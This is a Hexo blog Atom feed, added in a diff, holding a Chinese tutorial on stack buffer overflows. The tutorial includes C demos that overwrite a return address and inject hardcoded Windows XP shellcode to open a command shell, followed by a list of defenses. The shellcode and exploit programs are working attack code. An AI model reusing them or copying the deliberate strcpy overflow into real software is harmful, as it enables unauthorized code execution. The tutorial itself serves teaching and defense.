@@ -1,0 +1,150 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>CodingCockroach@Dian</title>
+  <subtitle>生活时常妥协，Coding未曾将就</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="CodingCockroach.com/"/>
+  <updated>2016-06-01T09:19:52.838Z</updated>
+  <id>CodingCockroach.com/</id>
+  
+  <author>
+    <name>CodingCockroach@Dian</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>缓冲区溢出</title>
+    <link href="CodingCockroach.com/2016/05/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    <id>CodingCockroach.com/2016/05/24/缓冲区溢出/</id>
+    <published>2016-05-24T03:21:45.000Z</published>
+    <updated>2016-06-01T09:19:52.838Z</updated>
+    
+    <content type="html">&lt;p&gt;缓冲区溢出是一种非常普遍、非常危险的漏洞。它有多种英文名称，如buffer overflow、buffer overrun、smash the stack、trash the stack等等，它也是一种比较有历史的漏洞，多个著名的漏洞报告都和缓冲区溢出有关，在各种操作系统、应用软件中广泛存在。缓冲区溢出，可以导致的后果包括：程序运行失败；系统当机，重新启动；攻击者可能利用它执行非授权指令，取得系统特权，进而进行各种非法操作；等等。&lt;br&gt;一个非常著名的缓冲区溢出攻击是Morris蠕虫，它也是利用了某些机器上某些软件上存在的缓冲区溢出漏洞，发生在1988年，它曾造成了全世界大量网络服务器瘫痪。读者可以参考相关资料。缓冲区溢出的概念很简单。缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量溢出；某些情况下，溢出的数据只是覆盖在一些不太重要的内存空间上，不会产生严重后果；但是一旦溢出的数据覆盖在合法数据上，可能给系统带来巨大的危害。如下代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;void function(char *input)   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;char buffer[16];   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;strcpy(buffer,input);   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;strcpy()将直接将input中的内容copy到buffer中。只要input的长度大于16，就会造成buffer的溢出。当然，这里所说的缓冲区，实际上就存在于”堆栈”区内。&lt;br&gt;我们可以假设最理想的情况是：程序对输入字符串长度进行检查，确保输入的长度不超过缓冲区允许的长度；但是在复杂的程序中，并不是每个程序员都会考虑到这一点。很多程序员都会假定输入的长度不会超过数组大小，如果一厢情愿地假设数据长度总是与所分配的储存空间会匹配，就为缓冲区溢出埋下了隐患。攻击者通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。存在象strcpy这样的问题的标准函数还有：strcat()；sprintf()；vsprintf()；gets()；scanf()；等等。具体大家可以参考相应文档。&lt;br&gt;缓冲区溢出本身并不可怕，关键是发生缓冲区溢出时，会覆盖下一个相邻的内存块。由于编程语言的某些不安全的特性，它允许程序溢出缓冲区(当然，也许这种溢出是出于偶然)。在这个程序中，当发生缓冲区溢出时，可能会导致很多不可预料的行为，如：程序的执行很奇怪；程序完全失败；等等。&lt;br&gt;当然，不可否认，也有可能出现这样一种情况，程序碰巧没有覆盖重要数据，程序可以继续，而且在执行中没有任何明显不正常，但是具备安全隐患。该问题给软件的维护带来了难度。存在缓冲区溢出隐患的程序，隐患的发作是不确定的，这使得对它们的调试异常棘手。&lt;br&gt;上一段所叙述的情况实际上是一种最坏的情况：在一个环境下(如开发阶段的测试过程中)，程序可能发生了缓冲区溢出，但因为没有覆盖重要数据，根本没有任何不正常；但在另一个环境下，可能在发生溢出时，碰巧地修改了分配在缓冲区附近的数据，程序执行发生不正常现象。从维护的角度讲，因为这种事情完全是”碰巧”，等到维护人员去维护时，问题就找不到了，白白花费维护人员的精力，并且可能得不到问题的本质解决。&lt;br&gt;缓冲区溢出有时候可能改变程序流程。举一个简单的例子，如果碰巧在缓冲区后面的内存中有一个布尔变量，该变量为true(1)或false(0)，决定用户是否可以执行某个敏感操作。如果该变量被缓冲区溢出的数据覆盖，可能由false(0)变为true(1)，程序的执行流程被更改。&lt;br&gt;上面的例子给出了缓冲区溢出的发生机制。当然，随便往缓冲区中填入内容，让缓冲区溢出，一般只是出现一些异常现象，顶多让程序崩溃，而不能达到刻意攻击的目的。&lt;br&gt;站在攻击者角度，让用户程序崩溃，属于没有什么技术含量的攻击。最常见的手段是：通过输入一段数据，造成缓冲区溢出，使程序运行一个用户命令。极端情况下，如果该程序属于管理员而且具有针对系统的任意操作权限的话，攻击者就可以利用这个漏洞造成更大的危害。&lt;br&gt;下面用一个例子来讲解缓冲区攻击的原理。所使用的环境为Microsoft Visual C++ 6.0，操作系统为Microsoft Windows XP Professional SP2。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;//Test01.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void fun1(char *input)   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    char buffer[10];  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    strcpy(buffer,input);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    printf(&amp;quot;Call fun1,buffer=%s\n&amp;quot;,buffer);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void fun2()   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    printf(&amp;quot;Call fun2&amp;quot;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int main(int argc, char *argv[])  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  printf(&amp;quot;Address Of fun2=%p\n&amp;quot;,fun2);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  fun1(argv[1]);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return 0;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;在命令行中运行：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Test01.exe Security&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;结果为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Address of fun2=00401005&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Call fun1,buffer=Security&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这是正常的。但如果输入一个长度大于10的字符串，如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Test01.exe abcdefghijklmnopqrstuvwxyz1234567890&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;则提示&lt;br&gt;“0x74737271”指令引用的”0x74737271”内存。该内存不能为”read”。&lt;br&gt;下面分析以下错误的提示：&lt;br&gt;该错误提示中，出现了一个”0x74737271”，”0x74”是字符”t”的ASCII码，”0x73”是字符”s”的ASCII码，”0x72”是字符”r”的ASCII码，”0x71”是字符”q”的ASCII码。这说明什么问题？&lt;br&gt;该问题出现的原因是，由于输入的字符串太长，数组buffer容纳不下，但是也要将多余的字符写入堆栈。这些多余的字符没有分配合法的空间，就会覆盖堆栈中以前的内容。如果覆盖的内容仅仅是一些普通数据，表面上也不会出什么问题，只是会造成原有数据的丢失。&lt;br&gt;但是，堆栈中还有一块区域专门保存着指令指针，存放下一个CPU指令存放的内存地址(你可以理解为某个函数的地址)。如果该处被覆盖，系统会错误地将覆盖的新值当成某个指令来执行。如上面的例子中，刚好是”qrst”(0x74737271)覆盖了那一片区域，系统会将”qrst”(0x74737271)的 ASCII 码视作返回地址，认为程序接下来要执行的是0x74737271所指向的那个函数，因此试图执行0x74737271处的指令，出现难以预料的后果，程序出错退出。&lt;br&gt;但是，仅仅让程序出错退出并没有什么用。如果将该处的内容不用”qrst”覆盖，而用函数fun2的地址覆盖，我们就可以运行函数fun2了！&lt;br&gt;现在我们用fun2的地址(00401005)去覆盖输入参数中”qrst”所在的内存，伪造下一个函数的地址，编写如下代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;//Test02.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void fun1(char *input)   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    char buffer[10];  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    strcpy(buffer,input);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    printf(&amp;quot;Call fun1,buffer=%s\n&amp;quot;,buffer);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void fun2()   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    printf(&amp;quot;Call fun2&amp;quot;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int main(int argc, char *argv[])  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  printf(&amp;quot;Address Of fun2=%p\n&amp;quot;,fun2);                               &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  fun1(&amp;quot;abcdefghijklmnop\x05\x10\x40\x00&amp;quot;);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return 0;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;运行Test02.exe,控制台上显示：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Address Of fun2=00401005&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Call fun1,buffer=abcdefghijklmnop@&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Call fun2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;注意！fun2函数被调用了！&lt;br&gt;在中文win2000、2003、xp中，指令通用跳转地址为 0x7ffa4512，如果命令该指令执行，程序就可以跳转到其它地方，运行其它程序，程序可以用shellcode来表示(有关shellcode，大家可以参考相应的文献)。如以下shellcode代码，表示打开一个命令行窗口：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53&amp;quot;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x77\x1d\x80\x7c&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x52\x8D\x45\xF4\x50\xFF\x55\xF0&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x50\xB8&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xc7\x93\xbf\x77&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xFF\xD0&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x83\xC4\x12\x5D&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;编写如下代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;//Test03.c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//windows xp sp2 system地址0x7801afc3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;//windows xp sp2 loadlibrary地址0x77e69f64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void fun1(char *input)   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    char buffer[10];  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    strcpy(buffer,input);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    printf(&amp;quot;Call fun1,buffer=%s\n&amp;quot;,buffer);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int main(int argc, char *argv[])  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  char buffer[] = &amp;quot;abcdefghijklmnop\x12\x45\xfa\x7f&amp;quot;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53&amp;quot;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x77\x1d\x80\x7c&amp;quot;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x52\x8D\x45\xF4\x50\xFF\x55\xF0&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x50\xB8&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xc7\x93\xbf\x77&amp;quot;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\xFF\xD0&amp;quot;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;\x83\xC4\x12\x5D&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  fun1(buffer);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return 0;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;生成相应exe文件，运行时，能够打开控制台命令窗口。如果有权限，可以进行任意操作。&lt;br&gt;相应的防范方法：&lt;br&gt;如前所述，缓冲区溢出的原理，是通过将远程恶意代码注入到目标程序中以实现攻击的方法。就程序本质而言，缓冲区溢出的根本原因是由于像C、C++语言本身的不安全，如没有任何数组的界限检查和指针引用的检查，因此，检查边界成为最有效的工作，否则程序将冒着存在漏洞的风险。&lt;br&gt;解决缓冲区溢出的方法有如下几种：&lt;br&gt;1：积极检查边界。由于C和C++允许任意的缓冲区溢出，没有任何的缓冲区溢出边界检测机制来进行限制，因此，一般情况下，所有开发者需要手动在自己的代码中添加边界检测机制。&lt;br&gt;不过，也有一些优化的技术来减少手工检查的次数。如使用Richard Jones和Paul Kelly开发的gcc补丁、利用Compaq的 C 编译器等。&lt;br&gt;2：不让攻击者执行缓冲区内的命令。这种方法使得攻击者即使在被攻击者的缓冲区中植入了执行代码之后，也无法执行被植入的代码。具体方法大家可以参考相关的文献。&lt;br&gt;3：编写风格良好的代码。养成一个习惯，不要因为一味追求程序性能，而编写一些安全隐患较多的代码，特别是不要使用一些可能有漏洞的API，减少漏洞发生的可能。可以用一些查错工具，限制一些可能具有缓冲区溢出漏洞攻击的函数的调用(如strcpy和sprintf等)。&lt;br&gt;4：程序指针检查。程序指针检查不同于边界检查，程序指针检查是一旦修改了程序指针，就会被检测到，被改变的指针将不被使用。这样，即使一个攻击者成功地改变了程序的指针，因为系统事先检测到了指针的改变，这个指针将不会被使用，达不到攻击的目的。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
